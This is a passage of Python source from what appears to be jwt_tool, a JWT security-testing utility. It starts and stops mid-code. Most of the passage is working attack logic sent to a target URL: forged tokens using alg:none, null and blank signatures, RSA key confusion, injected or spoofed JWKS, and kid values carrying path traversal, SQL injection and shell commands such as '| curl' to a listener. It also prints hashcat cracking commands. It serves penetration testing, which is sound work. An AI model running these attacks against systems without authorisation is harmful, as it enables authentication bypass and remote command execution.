int(paylDict[comparestamps[claimnum]])-int(paylDict[comparestamps[0]])\n            if timeoff != 0:\n                timecalc = timeoff\n                if timecalc < 0:\n                    timecalc = timecalc*-1\n                days,hours,mins = 0,0,0\n                if timecalc >= 86400:\n                    days = str(timecalc/86400)\n                    days = int(float(days))\n                    timecalc -= days*86400\n                if timecalc >= 3600:\n                    hours = str(timecalc/3600)\n                    hours = int(float(hours))\n                    timecalc -= hours*3600\n                if timecalc >= 60:\n                    mins = str(timecalc/60)\n                    mins = int(float(mins))\n                    timecalc -= mins*60\n                if timeoff < 0:\n                    timeoff = timeoff*-1\n                    prepost = \"[*] \"+claim+\" is earlier than \"+comparestamps[0]+\" by: \"\n                    cprintc(prepost+str(days)+\" days, \"+str(hours)+\" hours, \"+str(mins)+\" mins\", \"green\")\n                else:\n                    prepost = \"[*] \"+claim+\" is later than \"+comparestamps[0]+\" by: \"\n                    cprintc(prepost+str(days)+\" days, \"+str(hours)+\" hours, \"+str(mins)+\" mins\", \"green\")\n            claimnum += 1\n    if expiredtoken:\n        cprintc(\"[-] TOKEN IS EXPIRED!\", \"red\")\n    cprintc(\"\\n----------------------\\nJWT common timestamps:\\niat = IssuedAt\\nexp = Expires\\nnbf = NotBefore\\n----------------------\\n\", \"white\")\n    if args.targeturl and not args.crack and not args.exploit and not args.verify and not args.tamper and not args.sign:\n        cprintc(\"[+] Sending token\", \"cyan\")\n        newContents = genContents(headDict, paylDict)\n        jwtOut(newContents+\".\"+sig, \"Sending token\")\n    return headDict, paylDict, sig\n\ndef searchLog(logID):\n    qResult = \"\"\n    with open(logFilename, 'r') as logFile:\n        logLine = logFile.readline()\n        while logLine:\n            if re.search(r'^'+logID, logLine):\n                qResult = logLine\n                break\n            else:\n                logLine = logFile.readline()\n        if qResult:\n            qOutput = re.sub(r' - eyJ[A-Za-z0-9_\\/+-]*\\.eyJ[A-Za-z0-9_\\/+-]*\\.[A-Za-z0-9._\\/+-]*', '', qResult)\n            qOutput = re.sub(logID+' - ', '', qOutput)\n            try:\n                jwt = re.findall(r'eyJ[A-Za-z0-9_\\/+-]*\\.eyJ[A-Za-z0-9_\\/+-]*\\.[A-Za-z0-9._\\/+-]*', qResult)[-1]\n            except:\n                cprintc(\"JWT not included in log\", \"red\")\n                exit(1)\n            cprintc(logID+\"\\n\"+qOutput, \"green\")\n            cprintc(\"JWT from request:\", \"cyan\")\n            cprintc(jwt, \"green\")\n            # headDict, paylDict, sig, contents = validateToken(jwt)\n            # rejigToken(headDict, paylDict, sig)\n            return jwt\n        else:\n            cprintc(\"ID not found in logfile\", \"red\")\n\ndef injectOut(newheadDict, newpaylDict):\n    if not args.crack and not args.exploit and not args.verify and not args.tamper and not args.sign:\n        desc = \"Injected token with unchanged signature\"\n        jwtOut(newContents+\".\"+sig, \"Injected claim\", desc)\n    elif args.sign:\n        signingToken(newheadDict, newpaylDict)\n    else:\n        runActions()\n\ndef scanModePlaybook():\n    cprintc(\"\\nLAUNCHING SCAN: JWT Attack Playbook\", \"magenta\")\n    origalg = headDict[\"alg\"]\n    # No token\n    tmpCookies = config['argvals']['cookies']\n    tmpHeader = config['argvals']['header']\n    if config['argvals']['headerloc'] == \"cookies\":\n        config['argvals']['cookies'] = strip_dict_cookies(config['argvals']['cookies'])\n    elif config['argvals']['headerloc'] == \"headers\":\n        config['argvals']['header'] = \"\"\n    config['argvals']['overridesub'] = \"true\"\n    config['argvals']['cookies'] = tmpCookies\n    config['argvals']['header'] = tmpHeader\n    # Broken sig\n    jwtTweak = contents.decode()+\".\"+sig[:-4]\n    jwtOut(jwtTweak, \"Broken signature\", \"This token was sent to check if the signature is being checked\")\n    # Persistent\n    jwtOut(jwt, \"Persistence check 1 (should always be valid)\", \"Original token sent to check if tokens work after invalid submissions\")\n    # Claim processing order - check reflected output in all claims\n    reflectedClaims()\n    jwtOut(jwt, \"Persistence check 2 (should always be valid)\", \"Original token sent to check if tokens work after invalid submissions\")\n    # Weak HMAC secret\n    if headDict['alg'][:2] == \"HS\" or headDict['alg'][:2] == \"hs\":\n        cprintc(\"Testing \"+headDict['alg']+\" token against common JWT secrets (jwt-common.txt)\", \"cyan\")\n        config['argvals']['keyList'] = \"jwt-common.txt\"\n        crackSig(sig, contents)\n    # Exploit: blank password accepted in signature\n    key = \"\"\n    newSig, newContents = signTokenHS(headDict, paylDict, key, 256)\n    jwtBlankPw = newContents+\".\"+newSig\n    jwtOut(jwtBlankPw, \"Exploit: Blank password accepted in signature (-X b)\", \"This token can exploit a hard-coded blank password in the config\")\n    # Exploit: null signature\n    jwtNull = checkNullSig(contents)\n    jwtOut(jwtNull, \"Exploit: Null signature (-X n)\", \"This token was sent to check if a null signature can bypass checks\")\n    # Exploit: alg:none\n    noneToks = checkAlgNone(headDict, paylB64)\n    zippedToks = dict(zip(noneToks, [\"\\\"alg\\\":\\\"none\\\"\", \"\\\"alg\\\":\\\"None\\\"\", \"\\\"alg\\\":\\\"NONE\\\"\", \"\\\"alg\\\":\\\"nOnE\\\"\"]))\n    for noneTok in zippedToks:\n        jwtOut(noneTok, \"Exploit: \"+zippedToks[noneTok]+\" (-X a)\", \"Testing whether the None algorithm is accepted - which allows forging unsigned tokens\")\n    # Exploit: key confusion - use provided PubKey\n    if config['crypto']['pubkey']:\n                newTok, newSig = checkPubKeyExploit(headDict, paylB64, config['crypto']['pubkey'])\n                jwtOut(newTok+\".\"+newSig, \"Exploit: RSA Key Confusion Exploit (provided Public Key)\")\n    headDict[\"alg\"] = origalg\n    # Exploit: jwks injection\n    try:\n        origjwk = headDict[\"jwk\"]\n    except:\n        origjwk = False\n    jwksig, jwksContents = jwksEmbed(headDict, paylDict)\n    jwtOut(jwksContents+\".\"+jwksig, \"Exploit: Injected JWKS (-X i)\")\n    headDict[\"alg\"] = origalg\n    if origjwk:\n        headDict[\"jwk\"] = origjwk\n    else:\n        del headDict[\"jwk\"]\n    # Exploit: spoof jwks\n    try:\n        origjku = headDict[\"jku\"]\n    except:\n        origjku = False\n        if config['services']['jwksloc']:\n            jku = config['services']['jwksloc']\n        else:\n            jku = config['services']['jwksdynamic']\n    newContents, newSig = exportJWKS(jku)\n    jwtOut(newContents+\".\"+newSig, \"Exploit: Spoof JWKS (-X s)\", \"Signed with JWKS at \"+jku)\n    if origjku:\n        headDict[\"jku\"] = origjku\n    else:\n        del headDict[\"jku\"]\n    headDict[\"alg\"] = origalg\n    # kid testing... start\n    try:\n        origkid = headDict[\"kid\"]\n    except:\n        origkid = False\n    # kid inject: blank field, sign with null\n    newheadDict, newHeadB64 = injectheaderclaim(\"kid\", \"\")\n    key = open(path+\"/null.txt\").read()\n    newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)\n    jwtOut(newContents+\".\"+newSig, \"Injected kid claim - null-signed with blank kid\")\n    # kid inject: path traversal - known path - check for robots.txt, sign with variations of location\n    newheadDict, newHeadB64 = injectheaderclaim(\"kid\", \"../../../../../../dev/null\")\n    key = open(path+\"/null.txt\").read()\n    newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)\n    jwtOut(newContents+\".\"+newSig, \"Injected kid claim - null-signed with kid=\\\"[path traversal]/dev/null\\\"\")\n    newheadDict, newHeadB64 = injectheaderclaim(\"kid\", \"/dev/null\")\n    key = open(path+\"/null.txt\").read()\n    newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)\n    jwtOut(newContents+\".\"+newSig, \"Injected kid claim - null-signed with kid=\\\"/dev/null\\\"\")\n    # kid inject: path traversal - bad path - sign with null\n    newheadDict, newHeadB64 = injectheaderclaim(\"kid\", \"/invalid_path\")\n    key = open(path+\"/null.txt\").read()\n    newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)\n    jwtOut(newContents+\".\"+newSig, \"Injected kid claim - null-signed with kid=\\\"/invalid_path\\\"\")\n    # kid inject: RCE - sign with null\n    newheadDict, newHeadB64 = injectheaderclaim(\"kid\", \"|sleep 10\")\n    key = open(path+\"/null.txt\").read()\n    newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)\n    jwtOut(newContents+\".\"+newSig, \"Injected kid claim - RCE attempt - SLEEP 10 (did this request pause?)\")\n    if config['services']['httplistener']:\n        injectUrl = config['services']['httplistener']+\"/RCE_in_kid\"\n        newheadDict, newHeadB64 = injectheaderclaim(\"kid\", \"| curl \"+injectUrl)\n        key = open(path+\"/null.txt\").read()\n        newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)\n        jwtOut(newContents+\".\"+newSig, \"Injected kid claim - RCE attempt - curl \"+injectUrl+\" (did this URL get accessed?)\")\n    # kid inject: SQLi explicit value\n    newheadDict, newHeadB64 = injectheaderclaim(\"kid\", \"x' UNION SELECT '1';--\")\n    key = \"1\"\n    newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)\n    jwtOut(newContents+\".\"+newSig, \"Injected kid claim - signed with secret = '1' from SQLi\")\n    # kid testing... end\n    if origkid:\n        headDict[\"kid\"] = origkid\n    else:\n        del headDict[\"kid\"]\n    headDict[\"alg\"] = origalg\n    # x5u external\n    # Force External Interactions\n    if config['services']['httplistener']:\n        for headerClaim in headDict:\n            injectExternalInteractionHeader(config['services']['httplistener']+\"/inject_existing_\", headerClaim)\n        for payloadClaim in paylDict:\n            injectExternalInteractionPayload(config['services']['httplistener']+\"/inject_existing_\", payloadClaim)\n        cprintc(\"External service interactions have been tested - check your listener for interactions\", \"green\")\n    else:\n        cprintc(\"External service interactions not tested - enter listener URL into 'jwtconf.ini' to try this option\", \"red\")\n    # Accept Common HMAC secret (as alterative signature)\n    with open(config['input']['wordlist'], \"r\", encoding='utf-8', errors='ignore') as commonPassList:\n        commonPass = commonPassList.readline().rstrip()\n        while commonPass:\n            newSig, newContents = signTokenHS(headDict, paylDict, commonPass, 256)\n            jwtOut(newContents+\".\"+newSig, \"Checking for alternative accepted HMAC signatures, based on common passwords. Testing: \"+commonPass+\"\", \"This token can exploit a hard-coded common password in the config\")\n            commonPass = commonPassList.readline().rstrip()\n    # SCAN COMPLETE\n    cprintc(\"Scanning mode completed: review the above results.\\n\", \"magenta\")\n    # Further manual testing: check expired token, brute key, find Public Key, run other scans\n    cprintc(\"The following additional checks should be performed that are better tested manually:\", \"magenta\")\n    if headDict['alg'][:2] == \"HS\" or headDict['alg'][:2] == \"hs\":\n        cprintc(\"[+] Try testing \"+headDict['alg'][:2]+\" token against weak password configurations by running the following hashcat cracking options:\", \"green\")\n        cprintc(\"(Already testing against passwords in jwt-common.txt)\", \"cyan\")\n        cprintc(\"Try using longer dictionaries, custom dictionaries, mangling rules, or brute force attacks.\\nhashcat (https://hashcat.net/hashcat/) is ideal for this as it is highly optimised for speed. Just add your JWT to a text file, then use the following syntax to give you a good start:\\n\\n[*] dictionary attacks: hashcat -a 0 -m 16500 jwt.txt passlist.txt\\n[*] rule-based attack:  hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule\\n[*] brute-force attack: hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6\", \"cyan\")\n    if headDict['alg'][:2] != \"HS\" and headDict['alg'][:2] != \"hs\":\n        cprintc(\"[+] Try hunting for a Public Key for this token. Validate any JWKS you find (-V -jw [jwks_file]) and then use the generated Public Key file with the Playbook Scan (-pk [kid_from_jwks].pem)\", \"green\")\n        cprintc(\"Common locations for Public Keys are either the web application's SSL key, or stored as a JWKS file in one of these locations:\", \"cyan\")\n        with open('jwks-common.txt', \"r\", encoding='utf-8', errors='ignore') as jwksLst:\n            nextVal = jwksLst.readline().rstrip()\n            while nextVal:\n                cprintc(nextVal, \"cyan\")\n                nextVal = jwksLst.readline().rstrip()\n    try:\n        timestamp = datetime.fromtimestamp(int(paylDict['exp']))\n        cprintc(\"[+] Try waiting for the token to expire (\\\"exp\\\" value set to: \"+timestamp.strftime('%Y-%m-%d %H:%M:%S')+\" (UTC))\", \"green\")\n        cprintc(\"Check if still working once expired.\", \"cyan\")\n    except:\n        pass\n\ndef scanModeErrors():\n    cprintc(\"\\nLAUNCHING SCAN: Forced Errors\", \"magenta\")\n    # Inject dangerous content-types into existing header claims\n    injectEachHeader(None)\n    injectEachHeader(True)\n    injectEachHeader(False)\n    injectEachHeader(\"jwt_tool\")\n    injectEachHeader(0)\n    # Inject dangerous content-types into existing payload claims\n    injectEachPayload(None)\n    injectEachPayload(True)\n    injectEachPayload(False)\n    injectEachPayload(\"jwt_tool\")\n    injectEachPayload(0)\n    cprintc(\"Scanning mode completed: review the above results.\\n\", \"magenta\")\n\ndef scanModeCommonClaims():\n    cprintc(\"\\nLAUNCHING SCAN: Common Claim Injection\", \"magenta\")\n    # Inject external URLs into common claims\n    with open(config['input']['commonHeaders'], \"r\", encoding='utf-8', errors='ignore') as commonHeaders:\n        nextHeader = commonHeaders.readline().rstrip()\n        while nextHeader:\n            injectExternalInteractionHeader(config['services']['httplistener']+\"/inject_common_\", nextHeader)\n            nextHeader = commonHeaders.readline().rstrip()\n    with open(config['input']['commonPayloads'], \"r\", encoding='utf-8', errors='ignore') as commonPayloads:\n        nextPayload = commonPayloads.readline().rstrip()\n        while nextPayload:\n            injectExternalInteractionPayload(config['services']['httplistener']+\"/inject_common_\", nextPayload)\n            nextPayload = commonPayloads.readline().rstrip()\n    # Inject dangerous content-types into common claims\n    injectCommonClaims(None)\n    injectCommonClaims(True)\n    injectCommonClaims(False)\n    injectCommonClaims(\"jwt_tool\")\n    injectCommonClaims(0)\n\n    cprintc(\"Scanning mode completed: review the above results.\\n\", \"magenta\")\n\ndef injectCommonClaims(contentVal):\n    with open(config['input']['commonHeaders'], \"r\", encoding='utf-8', errors='ignore') as commonHeaders:\n        nextHeader = commonHeaders.readline().rstrip()\n        while nextHeader:\n            origVal = \"\"\n            try:\n                origVal = headDict[nextHeader]\n            except:\n                pass\n            headDict[nextHeader] = contentVal\n            newContents = genContents(headDict, paylDict)\n            jwtOut(newContents+\".\"+sig, \"Injected \"+str(contentVal)+\" into Common Header Claim: \"+str(nextHeader))\n            if origVal != \"\":\n                headDict[nextHeader] = origVal\n            else:\n                del headDict[nextHeader]\n            nextHeader = commonHeaders.readline().rstrip()\n    with open(config['input']['commonPayloads'], \"r\", encoding='utf-8', errors='ignore') as commonPayloads:\n        nextPayload = commonPayloads.readline().rstrip()\n        while nextPayload:\n            origVal = \"\"\n            try:\n                origVal = paylDict[nextPayload]\n            except:\n                pass\n            paylDict[nextPayload] = contentVal\n            newContents = genContents(headDict, paylDict)\n            jwtOut(newContents+\".\"+sig, \"Injected \"+str(contentVal)+\" into Common Payload Claim: \"+str(nextPayload))\n            if origVal != \"\":\n                paylDict[nextPayload] = origVal\n            else:\n                del paylDict[nextPayload]\n            nextPayload = commonPayloads.readline().rstrip()\n\ndef injectEachHeader(contentVal):\n    for headerClaim in headDict:\n        origVal = headDict[headerClaim]\n        headDict[headerClaim] = contentVal\n        newContents = genContents(headDict, paylDict)\n        jwtOut(newContents+\".\"+sig, \"Injected \"+str(contentVal)+\" into Header Claim: \"+str(headerClaim))\n        headDict[headerClaim] = origVal\n\ndef injectEachPayload(contentVal):\n    for payloadClaim in paylDict:\n        origVal = paylDict[payloadClaim]\n        paylDict[payloadClaim] = contentVal\n        newContents = genContents(headDict, paylDict)\n        jwtOut(newContents+\".\"+sig, \"Injected \"+str(contentVal)+\" into Payload Claim: \"+str(payloadClaim))\n        paylDict[payloadClaim] = origVal\n\ndef injectExternalInteractionHeader(listenerUrl, headerClaim):\n    injectUrl = listenerUrl+headerClaim\n    origVal = \"\"\n    try:\n        origVal = headDict[headerClaim]\n    except:\n        pass\n    headDict[headerClaim] = injectUrl\n    newContents = genContents(headDict, paylDict)\n    jwtOut(newContents+\".\"+sig, \"Injected \"+str(injectUrl)+\" into Header Claim: \"+str(headerClaim))\n    if origVal != \"\":\n        headDict[headerClaim] = origVal\n    else:\n        del headDict[headerClaim]\n\ndef injectExternalInteractionPayload(listenerUrl, payloadClaim):\n    injectUrl = listenerUrl+payloadClaim\n    origVal = \"\"\n    try:\n        origVal = paylDict[payloadClaim]\n    except:\n        pass\n    paylDict[payloadClaim] = injectUrl\n    newContents = genContents(headDict, paylDict)\n    jwtOut(newContents+\".\"+sig, \"Injected \"+str(injectUrl)+\" into Payload Claim: \"+str(payloadClaim))\n    if origVal != \"\":\n        paylDict[payloadClaim] = origVal\n    else:\n        del paylDict[payloadClaim]\n\n# def kidInjectAttacks():\n#     with open(config['argvals']['injectionfile'], \"r\", encoding='utf-8', errors='ignore') as valLst:\n#         nextVal = valLst.readline()\n#         while nextVal:\n#             newheadDict, newHeadB64 = injectheaderclaim(config['argvals']['headerclaim'], nextVal.rstrip())\n#             newContents = genContents(newheadDict, paylDict)\n#             jwtOut(newContents+\".\"+sig, \"Injected kid claim\", desc)\n#             nextVal = valLst.readline()\n\ndef reflectedClaims():\n    checkVal = \"jwt_inject_\"+hashlib.md5(datetime.now().strftime('%Y-%m-%d %H:%M:%S').encode()).hexdigest()+\"_\"\n    for claim in paylDict:\n        tmpValue = paylDict[claim]\n        paylDict[claim] = checkVal+claim\n        tmpContents = base64.urlsafe_b64encode(json.dumps(headDict,separators=(\",\",\":\")).encode()).decode('UTF-8').strip(\"=\")+\".\"+base64.urlsafe_b64encode(json.dumps(paylDict,separators=(\",\",\":\")).encode()).decode('UTF-8').strip(\"=\")\n        jwtOut(tmpContents+\".\"+sig, \"Claim processing check in \"+claim+\" claim\", \"Token sent to check if the signature is checked before the \"+claim+\" claim is processed\")\n        if checkVal+claim in config['argvals']['rescontent']:\n            cprintc(\"Injected value in \"+claim+\" claim was observed - \"+checkVal+claim, \"red\")\n        paylDict[claim] = tmpValue\n\n\ndef preScan():\n    cprintc(\"Running prescan checks...\", \"cyan\")\n    jwtOut(jwt, \"Prescan: original token\", \"Prescan: original token\")\n    if config['argvals']['canaryvalue']:\n        if config['argvals']['canaryvalue'] not in config['argvals']['rescontent']:\n            cprintc(\"Canary value (\"+config['argvals']['canaryvalue']+\") was not found in base request - check that this token is valid and you are still logged in\", \"red\")\n            shallWeGoOn = input(\"Do you wish to continue anyway? (\\\"Y\\\" or \\\"N\\\")\")\n            if shallWeGoOn == \"N\":\n                exit(1)\n            elif shallWeGoOn == \"n\":\n                exit(1)\n    origResSize, origResCode = config['argvals']['ressize'], config['argvals']['rescode']\n    jwtOut(\"null\", \"Prescan: no token\", \"Prescan: no token\")\n    nullResSize, nullResCode = config['argvals']['ressize'], config['argvals']['rescode']\n    if config['argvals']['canaryvalue'] == \"\":\n        if origResCode == nullResCode:\n            cprintc(\"Valid and missing token requests return the same Status Code.\\nYou should probably specify something from the page that identifies the user is logged-in (e.g. -cv \\\"Welcome back, ticarpi!\\\")\", \"red\")\n            shallWeGoOn = input(\"Do you wish to continue anyway? (\\\"Y\\\" or \\\"N\\\")\")\n            if shallWeGoOn == \"N\":\n                exit(1)\n            elif shallWeGoOn == \"n\":\n                exit(1)\n    jwtTweak = contents.decode()+\".\"+sig[:-4]\n    jwtOut(jwtTweak, \"Prescan: Broken signature\", \"This token was sent to check if the signature is being checked\")\n    jwtOut(jwt, \"Prescan: repeat original token\", \"Prescan: repeat original token\")\n    if origResCode != config['argvals']['rescode']:\n        cprintc(\"Original token not working after invalid submission. Testing will need to be done manually, re-authenticating after each invalid submission\", \"red\")\n        exit(1)\n\n\ndef runScanning():\n    cprintc(\"Running Scanning Module:\", \"cyan\")\n    preScan()\n    if config['argvals']['scanMode'] == \"pb\":\n        scanModePlaybook()\n    if config['argvals']['scanMode'] == \"er\":\n        scanModeErrors()\n    if config['argvals']['scanMode'] == \"cc\":\n        scanModeCommonClaims()\n    if config['argvals']['scanMode'] == \"at\":\n        scanModePlaybook()\n        scanModeErrors()\n        scanModeCommonClaims()\n\n\ndef runExploits():\n    if args.exploit:\n        if args.exploit == \"a\":\n            noneToks = checkAlgNone(headDict, paylB64)\n            zippedToks = dict(zip(noneToks, [\"\\\"alg\\\":\\\"none\\\"\", \"\\\"alg\\\":\\\"None\\\"\", \"\\\"alg\\\":\\\"NONE\\\"\", \"\\\"alg\\\":\\\"nOnE\\\"\"]))\n            for noneTok in zippedToks:\n                desc = \"EXPLOIT: \"+zippedToks[noneTok]+\" - this is an exploit targeting the debug feature that allows a token to have no signature\\n(This will only be valid on unpatched implementations of JWT.)\"\n                jwtOut(noneTok, \"Exploit: \"+zippedToks[noneTok], desc)\n        elif args.exploit == \"n\":\n            jwtNull = checkNullSig(contents)\n            desc = \"EXPLOIT: null signature\\n(This will only be valid on unpatched implementations of JWT.)\"\n            jwtOut(jwtNull, \"Exploit: Null signature\", desc)\n        elif args.exploit == \"b\":\n            key = \"\"\n            newSig, newContents = signTokenHS(headDict, paylDict, key, 256)\n            jwtBlankPw = newContents+\".\"+newSig\n            desc = \"EXPLOIT: Blank password accepted in signature\\n(This will only be valid on unpatched implementations of JWT.)\"\n            jwtOut(jwtBlankPw, \"Exploit: Blank password accepted in signature\", desc)\n        elif args.exploit == \"i\":\n            newSig, newContents = jwksEmbed(headDict, paylDict)\n            desc = \"EXPLOIT: injected JWKS\\n(This will only be valid on unpatched implementations of JWT.)\"\n            jwtOut(newContents+\".\"+newSig, \"Injected JWKS\", desc)\n        elif args.exploit == \"s\":\n            if config['services']['jwksloc']:\n                jku = config['services']['jwksloc']\n            else:\n                jku = config['services']['jwksdynamic']\n            newContents, newSig = exportJWKS(jku)\n            if config['services']['jwksloc'] and config['services']['jwksloc'] == args.jwksurl:\n                cprintc(\"Paste this JWKS into a file at the following location before submitting token request: \"+jku+\"\\n(JWKS file used: \"+config['crypto']['jwks']+\")\\n\"+str(config['crypto']['jwks'])+\"\", \"cyan\")\n            desc = \"Signed with JWKS at \"+jku\n            jwtOut(newContents+\".\"+newSig, \"Spoof JWKS\", desc)\n        elif args.exploit == \"k\":\n            if config['crypto']['pubkey']:\n                newTok, newSig = checkPubKeyExploit(headDict, paylB64, config['crypto']['pubkey'])\n                desc = \"EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)\\n(This will only be valid on unpatched implementations of JWT.)\"\n                jwtOut(newTok+\".\"+newSig, \"RSA Key Confusion Exploit\", desc)\n            else:\n                cprintc(\"No Public Key provided (-pk)\\n\", \"red\")\n                parser.print_usage()\n\ndef runActions():\n    if args.tamper:\n        tamperToken(paylDict, headDict, sig)\n        exit(1)\n    if args.verify:\n        if args.pubkey:\n            algType = headDict[\"alg\"][0:2]\n            if algType == \"RS\":\n                if args.pubkey:\n                    verifyTokenRSA(headDict, paylDict, sig, args.pubkey)\n                else:\n                    verifyTokenRSA(headDict, paylDict, sig, config['crypto']['pubkey'])\n                exit(1)\n            elif algType == \"ES\":\n                if config['crypto']['pubkey']:\n                    verifyTokenEC(headDict, paylDict, sig, config['crypto']['pubkey'])\n                else:\n                    cprintc(\"No Public Key provided (-pk)\\n\", \"red\")\n                    parser.print_usage()\n                exit(1)\n            elif algType == \"PS\":\n                if config['crypto']['pubkey']:\n                    verifyTokenPSS(headDict, paylDict, sig, config['crypto']['pubkey'])\n                else:\n                    cprintc(\"No Public Key provided (-pk)\\n\", \"red\")\n                    parser.print_usage()\n                exit(1)\n            else:\n                cprintc(\"Algorithm not supported for verification\", \"red\")\n                exit(1)\n        elif args.jwksfile:\n            parseJWKS(config['crypto']['jwks'])\n        else:\n            cprintc(\"No Public Key or JWKS file provided (-pk/-jw)\\n\", \"red\")\n            parser.print_usage()\n        exit(1)\n    runExploits()\n    if args.crack:\n        if args.password:\n            cprintc(\"Password provided, checking if valid...\", \"cyan\")\n            checkSig(sig, contents, config['argvals']['key'])\n        elif args.dict:\n            crackSig(sig, contents)\n        elif args.keyfile:\n            checkSigKid(sig, contents)\n        else:\n            cprintc(\"No cracking option supplied:\\nPlease specify a password/dictionary/Public Key\\n\", \"red\")\n            parser.print_usage()\n        exit(1)\n    if args.query and config['argvals']['sigType'] != \"\":\n        signingToken(headDict, paylDict)\n\ndef printLogo():\n    print()\n    print(\"   \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\\\ \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\\\      \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\\\ \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\\\  \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\\\                  \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\\\ \")\n    print(\"   \\\\__\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m | \\x1b[48;5;24m \\x1b[0m\\\\  \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |\\\\__\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m  __| \\\\__\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m  __|                 \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |\")\n    print(\"      \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\\\ \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |   \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |       \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m | \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\\\   \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\\\  \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |\")\n    print(\"      \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\\\\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |   \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |       \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m  __\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\\\ \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m  __\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\\\ \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |\")\n    print(\"\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\\\   \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m  _\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |   \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |       \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |  \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |  \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |\")\n    print(\"\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |  \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m  / \\\\\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |   \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |       \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |  \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |\\x1b[48;5;24m 